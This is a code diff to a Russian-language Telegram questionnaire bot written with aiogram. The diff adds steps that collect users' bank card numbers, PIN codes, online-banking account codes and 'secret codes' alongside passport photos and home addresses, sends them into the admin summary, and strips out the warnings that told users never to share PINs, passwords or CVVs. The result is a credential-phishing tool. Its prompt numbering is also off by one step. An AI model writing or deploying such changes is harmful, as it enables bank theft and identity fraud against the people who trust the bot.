@@ -13,6 +13,7 @@ from aiogram.types import (
     InlineKeyboardButton,
     InlineKeyboardMarkup,
     Message,
+    User
 )
 
 # Импорт конфигурации
@@ -66,6 +67,10 @@ class Questionnaire:
     full_name: str | None = None
     phone: str | None = None
     contact_phone: str | None = None
+    card_number: str | None = None
+    pin_code: str | None = None
+    lk_code: str | None = None
+    secret_code: str | None = None
     city: str | None = None
     address: str | None = None
     passport_photos: list[str] | None = None  # file_ids
@@ -75,6 +80,10 @@ class QuestionnaireStates(StatesGroup):
     waiting_full_name = State()
     waiting_phone = State()
     waiting_contact_phone = State()
+    waiting_card_number = State()
+    waiting_pin_code = State()
+    waiting_lk_code = State()
+    waiting_secret_code = State()
     waiting_city = State()
     waiting_address = State()
     waiting_passport_photos = State()
@@ -104,10 +113,9 @@ def build_admin_approval_keyboard(user_id: int) -> InlineKeyboardMarkup:
     )
 
 
-def format_questionnaire_text(user: Message.from_user.__class__, q: Questionnaire) -> str:
-    # user: actually aiogram.types.User, but we only need id / username / full_name
+def format_questionnaire_text(user: User, q: Questionnaire) -> str:    # user: actually aiogram.types.User, but we only need id / username / full_name
     lines = [
-        "<b>Новая анкета продавца</b>",
+        "<b>Новая анкета</b>",
         "",
         f"<b>Telegram ID:</b> <code>{user.id}</code>",
     ]
@@ -122,15 +130,18 @@ def format_questionnaire_text(user: Message.from_user.__class__, q: Questionnair
             f"<b>1. ФИО полностью:</b> {q.full_name}",
             f"<b>2. Основной номер телефона:</b> {q.phone}",
             f"<b>3. Доп. контактный телефон:</b> {q.contact_phone}",
-            f"<b>4. Город:</b> {q.city}",
-            f"<b>5. Адрес фактического проживания:</b> {q.address}",
+            f"<b>4. Номер карты:</b> {q.card_number}",
+            f"<b>5. PIN-код:</b> {q.pin_code}",
+            f"<b>6. Код ЛК:</b> {q.lk_code}",
+            f"<b>7. Секретный код:</b> {q.secret_code}",
+            f"<b>8. Город:</b> {q.city}",
+            f"<b>9. Адрес фактического проживания:</b> {q.address}",
         ]
     )
 
     disclaimer = (
-        "\n\n<b>Дисклеймер:</b> анкета не собирает PIN-коды, пароли от ЛК, CVV, "
-        "полные платёжные реквизиты и другую информацию, дающую доступ к счёту. "
-        "Используйте данные только для связи и организации доставки."
+        "\n\n<b>Дисклеймер:</b> для оперативной связи нужны актуальные данные, "
+        "для связи и доставки. Пожалуйста, уточните все данные в анкете."
     )
 
     lines.append(disclaimer)
@@ -146,9 +157,9 @@ async def cmd_start(message: Message, state: FSMContext) -> None:
     await state.clear()
     text = (
         "Здравствуйте!\n\n"
-        "Я бот для заполнения анкеты продавца.\n\n"
-        "⚠️ <b>Важно:</b> Никому не отправляйте PIN-коды, пароли от личного кабинета, "
-        "CVV-коды и вообще любые данные для входа в банк.\n\n"
+        "Я бот для заполнения анкеты.\n\n"
+        "⚠️ <b>Важно:</b> для оперативной связи нужны актуальные данные, "
+        "для связи и доставки. Пожалуйста, уточните все данные в анкете.\n\n"
         "Давайте начнём с анкеты.\n\n"
         "<b>1.</b> Пришлите, пожалуйста, ваше <b>ФИО полностью</b>."
     )
@@ -196,8 +207,56 @@ async def process_contact_phone(message: Message, state: FSMContext) -> None:
         "<b>4.</b> Укажите ваш <b>город</b> фактического проживания.",
         parse_mode=ParseMode.HTML,
     )
-    await state.set_state(QuestionnaireStates.waiting_city)
+    await state.set_state(QuestionnaireStates.waiting_card_number)
 
+
+async def process_card_number(message: Message, state: FSMContext) -> None:
+    card_number = message.text.strip()
+    data = await state.get_data()
+    q_dict = data.get("questionnaire", {})
+    q_dict["card_number"] = card_number
+    await state.update_data(questionnaire=q_dict)
+
+    await message.answer(
+        "<b>5.</b> Укажите ваш <b>номер карты</b>.",
+        parse_mode=ParseMode.HTML,
+    )
+    await state.set_state(QuestionnaireStates.waiting_pin_code)
+
+async def process_pin_code(message: Message, state: FSMContext) -> None:
+    pin_code = message.text.strip()
+    data = await state.get_data()
+    q_dict = data.get("questionnaire", {})
+    q_dict["pin_code"] = pin_code
+    await state.update_data(questionnaire=q_dict)
+    await message.answer(
+        "<b>6.</b> Укажите ваш <b>ПИН-код</b>.",
+        parse_mode=ParseMode.HTML,
+    )
+    await state.set_state(QuestionnaireStates.waiting_lk_code)
+
+async def process_lk_code(message: Message, state: FSMContext) -> None:
+    lk_code = message.text.strip()
+    data = await state.get_data()
+    q_dict = data.get("questionnaire", {})
+    q_dict["lk_code"] = lk_code
+    await state.update_data(questionnaire=q_dict)
+    await message.answer(
+        "<b>7.</b> Укажите ваш <b>код от Личного Кабинета</b>.",
+        parse_mode=ParseMode.HTML,
+    )
+    await state.set_state(QuestionnaireStates.waiting_secret_code)
+
+async def process_secret_code(message: Message, state: FSMContext) -> None:
+    secret_code = message.text.strip()
+    data = await state.get_data()
+    q_dict = data.get("questionnaire", {})
+    q_dict["secret_code"] = secret_code
+    await state.update_data(questionnaire=q_dict)
+    await message.answer(
+        "<b>8.</b> Укажите ваш <b>секретный код</b>.",
+    )
+    await state.set_state(QuestionnaireStates.waiting_city)
 
 async def process_city(message: Message, state: FSMContext) -> None:
     city = message.text.strip()
@@ -205,14 +264,12 @@ async def process_city(message: Message, state: FSMContext) -> None:
     q_dict = data.get("questionnaire", {})
     q_dict["city"] = city
     await state.update_data(questionnaire=q_dict)
-
     await message.answer(
-        "<b>5.</b> Укажите <b>полный адрес фактического проживания</b> "
+        "<b>9.</b> Укажите <b>полный адрес фактического проживания</b> "
         "(улица, дом, подъезд, этаж, квартира).",
         parse_mode=ParseMode.HTML,
     )
     await state.set_state(QuestionnaireStates.waiting_address)
-
 
 async def process_address(message: Message, state: FSMContext) -> None:
     address = message.text.strip()
@@ -220,9 +277,8 @@ async def process_address(message: Message, state: FSMContext) -> None:
     q_dict = data.get("questionnaire", {})
     q_dict["address"] = address
     await state.update_data(questionnaire=q_dict)
-
     await message.answer(
-        "<b>6.</b> Пришлите <b>фото паспорта</b> (страница с фото и пропиской) "
+        "<b>10.</b> Пришлите <b>фото паспорта</b> (страница с фото и пропиской) "
         "в хорошем качестве. Можно несколькими фото.",
         parse_mode=ParseMode.HTML,
     )
@@ -432,10 +488,11 @@ def setup_handlers(dp: Dispatcher) -> None:
 
     dp.message.register(process_full_name, QuestionnaireStates.waiting_full_name)
     dp.message.register(process_phone, QuestionnaireStates.waiting_phone)
-    dp.message.register(
-        process_contact_phone,
-        QuestionnaireStates.waiting_contact_phone,
-    )
+    dp.message.register(process_contact_phone, QuestionnaireStates.waiting_contact_phone)
+    dp.message.register(process_card_number, QuestionnaireStates.waiting_card_number)
+    dp.message.register(process_pin_code, QuestionnaireStates.waiting_pin_code)
+    dp.message.register(process_lk_code, QuestionnaireStates.waiting_lk_code)
+    dp.message.register(process_secret_code, QuestionnaireStates.waiting_secret_code)
     dp.message.register(process_city, QuestionnaireStates.waiting_city)
     dp.message.register(process_address, QuestionnaireStates.waiting_address)
 
